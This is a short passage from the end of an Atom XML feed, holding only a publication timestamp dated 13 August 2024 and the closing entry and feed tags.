        <published>2024-08-13T21:01:42.000Z</published>
    </entry>
</feed>